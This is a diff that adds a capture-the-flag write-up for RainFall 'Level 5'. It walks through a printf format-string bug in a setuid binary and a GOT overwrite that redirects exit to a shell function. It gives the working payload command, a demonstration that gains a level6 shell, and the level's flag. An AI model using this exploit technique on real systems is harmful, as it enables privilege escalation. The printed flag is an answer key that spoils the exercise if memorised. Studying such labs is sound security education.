@@ -1,27 +1,173 @@
+# Level 5
 
-=> printf vulnerability like the previous execercise
-=> This time we overwrite the got.plt entry of exit with the function o() 
-=> function o execute a shell
-=> We create a payload with the address to overwrite and we do a classic format string exploit on the last 2 bytes
- 
+## General Informations 
 
-Overwrite GOT
-Replace exit plt function table by o() function
+**Path** : `/home/user/level5/level5` </br>
+**File** : 
+```
+level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5`
 
-080484a4 g     F .text	0000001e              o
-84a4 = 33956
-0804 = 2052 
+## Static Analysis
+
+After decompiling the binary with ghidra we get the pseudo code below: 
+
+```
+void o(void)
+{
+  system("/bin/sh");
+                    /* WARNING: Subroutine does not return */
+  _exit(1);
+}
+
+void n(void)
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+                    /* WARNING: Subroutine does not return */
+  exit(1);
+}
+
+void main(void)
+{
+  n();
+  return;
+}
+```
+
+The binary contains three functions:
+- `main`, which simply calls the `n` function.
+- `n`, where the core logic is implemented. It uses the secure `fgets` function to read user input into a buffer, then calls the function `p` with that buffer. The return instruction is replaced by a call to `exit`, so overwriting the return address of `n` is not possible.
+- `o`, which launches a shell. This function is not used in the standard execution flow and can only be identified by analyzing the ELF file in detail.
 
 
--> Get plt addres of exit:
-0x080484ff <+61>:	call   0x80483d0 <exit@plt>
--> disas 0x80483d0
-Dump of assembler code for function exit@plt:
-0x080483d0 <+0>:	jmp    *0x8049838
-0x080483d6 <+6>:	push   $0x28
-0x080483db <+11>:	jmp    0x8048370
--> exit@got.plt
-0x8049838 <exit@got.plt>:	0x00000004
+## Vulnerability found 
 
-(python -c 'print "\x38\x98\x04\x08" + "%33952x" + "%4$hn"'; cat) | ./level5
+The printf function is vulnerable to a **format string exploit**. </br>
+This vulnerability can be exploited to **read or write arbitrary memory**, and potentially execute malicious code. The issue arises from using unchecked user input directly as the format string parameter, which controls how the data is formatted and displayed. </br>
+[exploit-101-format-strings](https://axcheron.github.io/exploit-101-format-strings/)
 
+## Dynamic Analysis
+
+As in previous exercises, we are dealing with a **format string vulnerability**, which allows us to read from or write to arbitrary memory addresses. This time, our goal is to call the `o` function that spawns a shell.
+
+The address of `o` is `0x080484a4`:
+```
+> readelf -s level5
+...
+    67: 080484a4    30 FUNC    GLOBAL DEFAULT   13 o
+...
+``` 
+
+As usual, we begin by determining the position of our input on the stack:
+```
+(gdb) r <<< $(python -c 'print "AAAA" + " %p"*5')
+...
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
+```
+
+We find that our input is at the **4**th position.
+
+As mentioned in the static analysis, since the `exit` function is called instead of returning, overwriting the return address of `n` is useless. However, our attack surface is not limited to the stack or heap. If we have the right permissions, we can write elsewhere in the ELF memory layout.
+
+One interesting zone is the **Global Offset Table (GOT)**, and more specifically, the `.got.plt` section — the **Procedure Linkage Table** portion of the GOT.
+```
+> readelf -S level5
+...
+  [12] .plt              PROGBITS        08048370 000370 000080 04  AX  0   0 16
+...
+  [22] .got              PROGBITS        08049814 000814 000004 04  WA  0   0  4
+  [23] .got.plt          PROGBITS        08049818 000818 000028 04  WA  0   0  4
+...
+```
+
+Using tools like `readelf`, we can confirm that the `.got` and `.got.plt` sections have the `(WA)` flags — Writable and Allocatable — meaning they are writable during execution.
+
+[More information on ELF sections](https://www.sco.com/developers/gabi/2003-12-17/ch4.sheader.html)
+
+- The `.got.plt` section holds the resolved addresses of external functions (like those in **libc**), which is exactly what we are targeting.
+- On the other hand, `.got` stores data pointers, typically for global variables.
+
+When disassembling the `n` function, we see that the `call` instruction targets `exit@plt`:
+```
+(gdb)  disas n 
+...
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+
+(gdb) disas 0x80483d0 
+...
+   0x080483d0 <+0>:	jmp    *0x8049838
+   0x080483d6 <+6>:	push   $0x28
+   0x080483db <+11>:	jmp    0x8048370
+```
+
+Disassembling `exit@plt` reveals three instructions:
+
+- The second and third instructions are part of dynamic symbol resolution, used by the dynamic linker. We won’t go into detail here.  [More info](https://www.segmentationfault.fr/linux/role-plt-got-ld-so/)
+
+- The most important is the first instruction. This jumps to the address stored at `0x8049838`, which is an entry in `.got.plt`.
+
+  - On the first call, this address redirects the execution flow back to the second instruction in the `.plt`, which handles symbol resolution.
+```
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6 (0x080483d6 <exit@plt+6>:	push   $0x28)
+```
+  - On subsequent calls, the symbol is already resolved and the address in `.got.plt` directly points to the actual function in memory. For example, if we observe the `.got` entry for `printf` after it has been resolved, we may see:
+```
+(gdb) disas 0x8048380  <--- printf@plt
+Dump of assembler code for function printf@plt:
+   0x08048380 <+0>:	jmp    *0x8049824
+...
+(gdb) x 0x8049824
+0x8049824 <printf@got.plt>:	0xb7e78850
+...
+(gdb) info file
+...
+	0xb7e42f10 - 0xb7f7736c is .text in /lib/i386-linux-gnu/libc.so.6
+...
+(gdb) disas 0xb7e78850 
+Dump of assembler code for function printf:
+...
+```
+
+The address `0xb7e78850` points to the `printf` function in the `.text` section of `libc`.
+
+So, to hijack a function call, we overwrite its entry in `.got.plt`.
+
+
+## Payload construction 
+
+In our case, we target the `.got.plt` entry for `exit`, located at `0x8049838`, and overwrite it with the address of `o (0x080484a4)`.
+```
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6 -> 0x080484a4 (o)
+```
+
+We observe that the default value is `0x080483d6`, and the high bytes are the same as `0x080484a4`. Since only the lower two bytes differ, we can use the `%hn` format specifier to write just those two bytes.
+- We convert the last two bytes of `0x080484a4` to decimal: `0x84a4 = 33956`
+- We subtract the 4 bytes already written for the address: `33956 - 4 = 33952`
+
+
+Our payload will look like this (we also append a cat command to keep the shell alive):
+```
+(python -c 'print "\x38\x98\x04\x08" + "%33952X" + "%4$hn"'; cat)
+```
+
+## Demonstration 
+
+```
+level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%33952X" + "%4$hn"'; cat) | ./level5
+...
+
+whoami 
+level6
+```
+
+## Flag 
+
+```
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
